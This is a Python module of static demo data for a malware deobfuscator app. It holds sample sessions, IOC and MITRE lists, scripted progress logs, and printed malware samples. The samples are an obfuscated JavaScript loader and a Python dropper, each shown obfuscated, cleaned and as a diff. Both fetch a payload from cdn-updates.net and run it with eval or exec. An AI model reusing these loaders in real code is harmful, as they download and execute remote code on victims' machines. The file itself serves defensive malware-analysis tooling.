"""Static sample payloads mirroring deobfuscator-app/src/data.js.

Two variants are exposed via `samples(lang)`:
  - 'js' → javascript-obfuscator pipeline output
  - 'py' → pyarmor pipeline output
"""

from __future__ import annotations

SESSIONS = [
    {"id": 1, "name": "malware_loader.js",   "sev": "high", "time": "09:41",     "size": "51.2 KB", "layers": 3, "active": True},
    {"id": 2, "name": "stage2_dropper.py",   "sev": "high", "time": "08:17",     "size": "34.8 KB", "layers": 2, "active": False},
    {"id": 3, "name": "obf_payload_v3.js",   "sev": "med",  "time": "Yesterday", "size": "88.1 KB", "layers": 4, "active": False},
    {"id": 4, "name": "pyarmor_runtime.py",  "sev": "low",  "time": "Apr 27",    "size": "12.4 KB", "layers": 1, "active": False},
    {"id": 5, "name": "loader_packed.js",    "sev": "med",  "time": "Apr 26",    "size": "29.0 KB", "layers": 2, "active": False},
]

PHASES = [
    {"id": "detect", "label": "Detect", "short": "DET"},
    {"id": "unpack", "label": "Unpack", "short": "UNP"},
    {"id": "ast",    "label": "AST",    "short": "AST"},
    {"id": "rename", "label": "Rename", "short": "REN"},
    {"id": "ioc",    "label": "IOC",    "short": "IOC"},
]

# ─── JS pipeline ─────────────────────────────────────────────────────────────
JS_LAYER_CARDS = [
    {"id": 1, "label": "L1", "obfuscator": "javascript-obfuscator v3.5.1",
     "antiAnalysis": ["debugger_trap", "self_defending_iife"],
     "methods": ["static_ast", "dynamic"], "inputKB": 51.2, "outputKB": 28.1,
     "timeMs": 4210, "done": True, "entropy": 5.82},
    {"id": 2, "label": "L2", "obfuscator": "custom XOR string table (key=0x4A)",
     "antiAnalysis": [], "methods": ["static_ast"],
     "inputKB": 28.1, "outputKB": 19.3, "timeMs": 1840, "done": True, "entropy": 4.41},
    {"id": 3, "label": "L3", "obfuscator": "control-flow flattening",
     "antiAnalysis": [], "methods": ["static_ast"],
     "inputKB": 19.3, "outputKB": 12.7, "timeMs": None, "done": False, "entropy": None},
]

JS_IOCS = [
    {"type": "URL",    "value": "https://cdn-updates.net/payload/v2/init.php", "sev": "high"},
    {"type": "URL",    "value": "http://185.220.101.47/gate.php",              "sev": "high"},
    {"type": "Domain", "value": "cdn-updates.net",                             "sev": "high"},
    {"type": "IP",     "value": "185.220.101.47",                              "sev": "med"},
    {"type": "IP",     "value": "10.0.2.15",                                   "sev": "low"},
    {"type": "Wallet", "value": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",  "sev": "high"},
    {"type": "Key",    "value": "AIzaSyC4t6x8rd6vHQZ_API_KEY_REDACTED",        "sev": "med"},
    {"type": "Call",   "value": "eval(atob(…))",                               "sev": "high"},
    {"type": "Call",   "value": 'Function("return this")()',                   "sev": "med"},
    {"type": "Call",   "value": "navigator.sendBeacon(…)",                     "sev": "low"},
]

JS_MITRE = [
    {"id": "T1027",     "name": "Obfuscated Files or Information",        "tac": "Defense Evasion"},
    {"id": "T1059.007", "name": "Command & Scripting: JavaScript",        "tac": "Execution"},
    {"id": "T1041",     "name": "Exfiltration Over C2 Channel",           "tac": "Exfiltration"},
]

JS_OBFUSCATED = """var _0x4f2a=['push','ZmV0Y2g=','aHR0cHM6Ly9jZG4tdXBkYXRlcy5uZXQvcGF5bG9hZC92Mi9pbml0LnBocA==',
'cmVzcG9uc2U=','dGV4dA==','bG9jYWxTdG9yYWdl','c2V0SXRlbQ==','cGF5bG9hZA=='];
(function(_0x3e2d,_0x4f2a){var _0x1a3b=function(_0x5c4d){while(--_0x5c4d){
_0x3e2d['push'](_0x3e2d['shift']());}};_0x1a3b(++_0x4f2a);}(_0x4f2a,0x1b3));
var _0x1a3b=function(_0x3e2d,_0x4f2a){_0x3e2d=_0x3e2d-0x0;
var _0x1a3b=_0x4f2a[_0x3e2d];if(_0x1a3b['constructor']===String){
_0x1a3b=atob(_0x1a3b);}return _0x1a3b;};
!function(){var _0x5c4d=_0x1a3b('0x0');fetch(_0x1a3b('0x2'))
.then(function(_0x3e){return _0x3e[_0x1a3b('0x3')]()})
.then(function(_0x4f){window[_0x1a3b('0x4')][_0x1a3b('0x5')](_0x1a3b('0x6'),_0x4f);
eval(atob(_0x4f));});}();"""

JS_CLEAN = """// deobfuscated · jsdeobf v0.9.4 · LLM-rename applied
// layers: javascript-obfuscator → XOR table → CFF
// sample: malware_loader.js  sha256: a3f2...c8d1

async function fetchAndExecPayload() {
  // ⚠ IOC:HIGH  C2 endpoint
  const ENDPOINT = 'https://cdn-updates.net/payload/v2/init.php';
  const C2_IP    = '185.220.101.47';

  const response = await fetch(ENDPOINT);
  const encoded  = await response.text();

  // ⚠ IOC:LOW  persistence via localStorage
  localStorage.setItem('payload', encoded);

  // ⚠ IOC:HIGH  eval → dynamic execution chain
  eval(atob(encoded));
}

fetchAndExecPayload();"""

JS_DIFF = """  // deobfuscated — diff view (L3 original → renamed)
- var _0x4f2a=['push','ZmV0Y2g=','aHR0cHM6Ly9jZG4t…'];
- (function(_0x3e2d,_0x4f2a){ … }(_0x4f2a,0x1b3));
- var _0x1a3b=function(_0x3e2d,_0x4f2a){ … };
- !function(){
-   var _0x5c4d=_0x1a3b('0x0');
-   fetch(_0x1a3b('0x2'))
-   .then(function(_0x3e){ return _0x3e[_0x1a3b('0x3')](); })
-   .then(function(_0x4f){
-     window[_0x1a3b('0x4')][_0x1a3b('0x5')](_0x1a3b('0x6'),_0x4f);
-     eval(atob(_0x4f)); });
- }();
+ async function fetchAndExecPayload() {
+   const ENDPOINT = 'https://cdn-updates.net/payload/v2/init.php';
+   const response = await fetch(ENDPOINT);
+   const encoded  = await response.text();
+   localStorage.setItem('payload', encoded);
+   eval(atob(encoded));
+ }
+ fetchAndExecPayload();"""

# ─── Python pipeline ─────────────────────────────────────────────────────────
PY_LAYER_CARDS = [
    {"id": 1, "label": "L1", "obfuscator": "pyarmor v8.4.0",
     "antiAnalysis": ["runtime_check"], "methods": ["static_ast", "dynamic"],
     "inputKB": 34.8, "outputKB": 18.6, "timeMs": 3120, "done": True, "entropy": 6.11},
    {"id": 2, "label": "L2", "obfuscator": "lambda-XOR string table (key=0x4D)",
     "antiAnalysis": [], "methods": ["static_ast"],
     "inputKB": 18.6, "outputKB": 9.4, "timeMs": 1410, "done": True, "entropy": 4.20},
]

PY_IOCS = [
    {"type": "URL",    "value": "https://cdn-updates.net/payload/v2/init.php", "sev": "high"},
    {"type": "Domain", "value": "cdn-updates.net",                             "sev": "high"},
    {"type": "Path",   "value": "/tmp/.cache_x9",                              "sev": "low"},
    {"type": "Call",   "value": "exec(base64.b64decode(...))",                 "sev": "high"},
    {"type": "Call",   "value": "requests.get(ENDPOINT)",                      "sev": "med"},
]

PY_MITRE = [
    {"id": "T1027",     "name": "Obfuscated Files or Information", "tac": "Defense Evasion"},
    {"id": "T1059.006", "name": "Command & Scripting: Python",    "tac": "Execution"},
    {"id": "T1105",     "name": "Ingress Tool Transfer",           "tac": "Command and Control"},
]

PY_OBFUSCATED = """# pyarmor v8.4.0 — obfuscated
from pyarmor_runtime_007 import __pyarmor__
__pyarmor__(__name__, __file__, b'PY007\\x00\\x03\\x09...')
_0xf3a = lambda s: bytes([c ^ 0x4d for c in s]).decode()
_0x281 = [_0xf3a(b'..0\\x12\\x1a..'), _0xf3a(b'..\\x10..')]
exec(__import__('base64').b64decode(_0x281[1]))
"""

PY_CLEAN = """# Reverse-engineered C2 dropper
import requests, base64, os

ENDPOINT = 'https://cdn-updates.net/payload/v2/init.php'

def fetch_payload():
    r = requests.get(ENDPOINT)        # ⚠ IOC:HIGH C2 endpoint
    blob = r.text                     # ⚠ IOC:HIGH dynamic execution chain
    payload = base64.b64decode(blob)
    open('/tmp/.cache_x9', 'wb').write(payload)  # ⚠ IOC:LOW persistence
    exec(payload)                     # ⚠ IOC:HIGH eval-equivalent

if __name__ == '__main__':
    fetch_payload()
"""

PY_DIFF = """  # deobfuscated — diff view (pyarmor → renamed)
- from pyarmor_runtime_007 import __pyarmor__
- __pyarmor__(__name__, __file__, b'PY007\\x00\\x03\\x09...')
- _0xf3a = lambda s: bytes([c ^ 0x4d for c in s]).decode()
- _0x281 = [_0xf3a(b'..0\\x12\\x1a..'), _0xf3a(b'..\\x10..')]
- exec(__import__('base64').b64decode(_0x281[1]))
+ import requests, base64
+ ENDPOINT = 'https://cdn-updates.net/payload/v2/init.php'
+ def fetch_payload():
+     r = requests.get(ENDPOINT)
+     payload = base64.b64decode(r.text)
+     exec(payload)
"""

# ─── Log scripts (timed, language-flavoured) ─────────────────────────────────
# Each entry: (delay_ms_from_prev, level, indent, text, phase_id)
# phase_id is the analyzing-view phase that should be "active" when this line
# is emitted, so the frontend can drive its phase pills from the log stream.

JS_LOG_SCRIPT = [
    (0,    "INFO",  0, "──────────────── Layer 1/3 ────────────────────",                 "detect"),
    (20,   "DEBUG", 1, "Pattern detection: scanning 51 234 bytes",                         "detect"),
    (40,   "DEBUG", 2, "javascript_obfuscator: 97% (8/8 patterns)",                        "detect"),
    (30,   "DEBUG", 2, "string_array_rotation: 83% (1/2 patterns)",                        "detect"),
    (40,   "DEBUG", 2, "Source entropy: 5.82 (threshold: 5.5)",                            "detect"),
    (20,   "INFO",  1, "Detected: javascript_obfuscator (97%)",                            "detect"),
    (30,   "DEBUG", 1, "Phase: Dynamic analysis — eval triggers found",                    "unpack"),
    (20,   "DEBUG", 2, "anti-analysis: debugger_trap neutralised",                         "unpack"),
    (10,   "DEBUG", 2, "anti-analysis: self_defending_iife removed",                       "unpack"),
    (80,   "DEBUG", 2, "↳ Beautifier: 68 420 bytes",                                       "unpack"),
    (30,   "DEBUG", 2, "↳ Hex/Unicode String Decoder: 61 830 bytes (-6 590)",              "unpack"),
    (250,  "DEBUG", 2, "Dynamic string table: 123 entries resolved",                       "unpack"),
    (30,   "DEBUG", 2, "Accessor proxy functions: b, e, k, I, T, x, P, U, p, y…",          "ast"),
    (60,   "DEBUG", 2, "Pre-pass stringArrayDecoder: 200 change(s)",                       "ast"),
    (570,  "DEBUG", 2, "AST pass 1: 1931 changes",                                         "ast"),
    (250,  "DEBUG", 2, "AST pass 2: 15 changes",                                           "ast"),
    (270,  "DEBUG", 2, "AST pass 3: 13 changes",                                           "ast"),
    (390,  "DEBUG", 2, "AST pass 5: 12 changes",                                           "ast"),
    (170,  "DEBUG", 2, "AST pass 6: 4 changes",                                            "ast"),
    (210,  "DEBUG", 2, "AST pass 7: 0 changes — converged",                                "ast"),
    (10,   "DEBUG", 2, "↳ AST Simplification Pipeline: 28 110 bytes (-23 124)",            "ast"),
    (10,   "OK",    1, "Static analysis: 28 110 bytes  (−45.1%)  4.31s",                   "ast"),
    (0,    "INFO",  0, "──────────────── Layer 2/3 ────────────────────",                 "detect"),
    (30,   "DEBUG", 1, "Pattern detection: scanning 28 110 bytes",                         "detect"),
    (10,   "DEBUG", 2, "Source entropy: 4.41 (threshold: 5.5)",                            "detect"),
    (10,   "INFO",  1, "Detected: custom XOR string table (key=0x4A)",                     "detect"),
    (10,   "DEBUG", 2, "↳ Hex/Unicode String Decoder: not applicable",                     "unpack"),
    (160,  "DEBUG", 2, "AST pass 1: 1 changes",                                            "ast"),
    (150,  "DEBUG", 2, "AST pass 2: 13 changes",                                           "ast"),
    (340,  "DEBUG", 2, "AST pass 5: 2 changes",                                            "ast"),
    (230,  "DEBUG", 2, "AST pass 6: 0 changes — converged",                                "ast"),
    (10,   "DEBUG", 2, "↳ AST Simplification Pipeline: 19 300 bytes (-8 810)",             "ast"),
    (10,   "OK",    1, "Static analysis: 19 300 bytes  (−31.3%)  1.84s",                   "ast"),
    (0,    "INFO",  0, "──────────────── Layer 3/3 ────────────────────",                 "detect"),
    (30,   "DEBUG", 1, "Pattern detection: scanning 19 300 bytes",                         "detect"),
    (10,   "INFO",  1, "Detected: control-flow flattening",                                "detect"),
    (190,  "DEBUG", 2, "AST pass 1: 0 changes — converged",                                "ast"),
    (10,   "DEBUG", 2, "↳ AST Simplification Pipeline: 12 700 bytes (-6 600)",             "ast"),
    (10,   "INFO",  1, "Nothing more to extract — stopping.",                              "ast"),
    (10,   "DEBUG", 1, "LLM config: provider=openai, model=gpt-4o",                        "rename"),
    (4600, "OK",    1, "↳ LLM rename applied  (46s)",                                      "rename"),
    (500,  "OK",    1, "↳ Code formatted via LLM  (5s)",                                   "rename"),
    (10,   "INFO",  1, "Extracting IOCs…",                                                 "ioc"),
    (10,   "OK",    0, "Done. Processed 3 layer(s). 51 234 → 12 700 bytes  (−75.2%)  16.1s","ioc"),
]

PY_LOG_SCRIPT = [
    (0,    "INFO",  0, "──────────────── Layer 1/2 ────────────────────",        "detect"),
    (30,   "DEBUG", 1, "Pattern detection: scanning 35 642 bytes",                "detect"),
    (40,   "DEBUG", 2, "pyarmor_runtime: 99% (5/5 patterns)",                     "detect"),
    (30,   "DEBUG", 2, "Source entropy: 6.11 (threshold: 5.5)",                   "detect"),
    (20,   "INFO",  1, "Detected: pyarmor v8.4.0 (99%)",                          "detect"),
    (30,   "DEBUG", 1, "Phase: pyarmor runtime stripping",                        "unpack"),
    (40,   "DEBUG", 2, "anti-analysis: runtime_check disarmed",                   "unpack"),
    (80,   "DEBUG", 2, "↳ pyarmor bytecode dump: 24 110 bytes",                   "unpack"),
    (30,   "DEBUG", 2, "↳ Marshal decoder: 21 408 bytes (-2 702)",                "unpack"),
    (250,  "DEBUG", 2, "Decompyle3: 18 600 bytes",                                "ast"),
    (570,  "DEBUG", 2, "AST pass 1: 412 changes",                                 "ast"),
    (250,  "DEBUG", 2, "AST pass 2: 33 changes",                                  "ast"),
    (270,  "DEBUG", 2, "AST pass 3: 4 changes — converged",                       "ast"),
    (10,   "OK",    1, "Static analysis: 18 600 bytes  (−47.8%)  3.12s",          "ast"),
    (0,    "INFO",  0, "──────────────── Layer 2/2 ────────────────────",        "detect"),
    (30,   "DEBUG", 1, "Pattern detection: scanning 18 600 bytes",                "detect"),
    (10,   "INFO",  1, "Detected: lambda-XOR string table (key=0x4D)",            "detect"),
    (160,  "DEBUG", 2, "XOR table: 38 entries resolved",                          "unpack"),
    (340,  "DEBUG", 2, "AST pass 1: 14 changes",                                  "ast"),
    (230,  "DEBUG", 2, "AST pass 2: 0 changes — converged",                       "ast"),
    (10,   "DEBUG", 2, "↳ AST Simplification Pipeline: 9 400 bytes (-9 200)",     "ast"),
    (10,   "OK",    1, "Static analysis: 9 400 bytes  (−49.5%)  1.41s",           "ast"),
    (10,   "DEBUG", 1, "LLM config: provider=openai, model=gpt-4o",               "rename"),
    (3800, "OK",    1, "↳ LLM rename applied  (38s)",                             "rename"),
    (500,  "OK",    1, "↳ Code formatted via LLM  (4s)",                          "rename"),
    (10,   "INFO",  1, "Extracting IOCs…",                                        "ioc"),
    (10,   "OK",    0, "Done. Processed 2 layer(s). 35 642 → 9 400 bytes  (−73.6%)  9.4s", "ioc"),
]


def samples(lang: str) -> dict:
    """Return the bundle of static samples for the requested language."""
    if lang == "py":
        return {
            "engine": "pydeobf",
            "filename": "stage2_dropper.py",
            "sha256": "b7c1e9a4f02d1c83a4d8f0e1d12a3c4b5e6f7081...",
            "layer_cards": PY_LAYER_CARDS,
            "iocs": PY_IOCS,
            "mitre": PY_MITRE,
            "original_code": PY_OBFUSCATED,
            "clean_code": PY_CLEAN,
            "diff_code": PY_DIFF,
            "log_script": PY_LOG_SCRIPT,
        }
    return {
        "engine": "jsdeobf",
        "filename": "malware_loader.js",
        "sha256": "a3f2bcd91ef0...c8d1",
        "layer_cards": JS_LAYER_CARDS,
        "iocs": JS_IOCS,
        "mitre": JS_MITRE,
        "original_code": JS_OBFUSCATED,
        "clean_code": JS_CLEAN,
        "diff_code": JS_DIFF,
        "log_script": JS_LOG_SCRIPT,
    }
